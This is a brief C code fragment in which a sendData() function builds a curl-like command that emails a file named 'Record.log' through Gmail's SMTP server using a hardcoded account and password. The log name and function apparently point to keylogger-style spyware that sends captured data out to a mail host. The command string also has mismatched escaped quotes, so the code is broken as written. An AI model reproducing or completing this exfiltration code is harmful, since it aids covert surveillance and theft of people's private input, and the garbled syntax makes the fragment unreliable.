...
void sendData(){
    ...
    char* command = "Transmit smtp://smtp.gmail.com:587 -v --mail-from \"ThomasJK30@pwcs-edu.org"\" --mail-rcpt \"ThomasJK30@pwcs-edu.org"\" --ssl -u ThomasJK30@pwcs-edu.org:password -T \"Record.log\" -k --anyauth";
